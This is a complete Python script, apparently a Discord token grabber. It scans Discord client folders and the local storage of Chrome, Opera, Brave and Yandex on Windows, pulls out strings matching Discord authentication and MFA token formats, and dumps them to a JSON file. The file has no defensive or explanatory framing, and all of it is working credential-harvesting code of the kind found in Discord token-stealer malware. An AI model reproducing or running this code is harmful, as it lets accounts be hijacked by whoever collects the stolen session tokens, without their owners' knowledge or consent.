import os
import re
import json
import argparse
from rich.progress import Progress

class TokenFinder:

    def __init__(self, output_file):
        self.output_file = output_file
        self.local = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.paths = {
            'Discord': self.roaming + '\\Discord',
            'Discord Canary': self.roaming + '\\discordcanary',
            'Discord PTB': self.roaming + '\\discordptb',
            'Google Chrome': self.local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable',
            'Brave': self.local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': self.local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_value, traceback):
        pass

    def find_tokens(self, path):
        path += '\\Local Storage\\leveldb'

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue
            with open(f'{path}\\{file_name}', errors='ignore', encoding='utf-8') as f:
                for line in [x.strip() for x in f.readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            yield token

    def run(self):
        data = {}
        with Progress() as progress:
            task = progress.add_task("[cyan]Gathering Tokens...", total=len(self.paths))
            for platform, path in self.paths.items():
                if os.path.exists(path):
                    data[platform] = list(self.find_tokens(path))
                progress.advance(task)

        with open(self.output_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4)

        print('Done!')


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--output-file', '-o', default='temp.json', help='Output file name')
    args = parser.parse_args()

    with TokenFinder(args.output_file) as token_finder:
        token_finder.run()
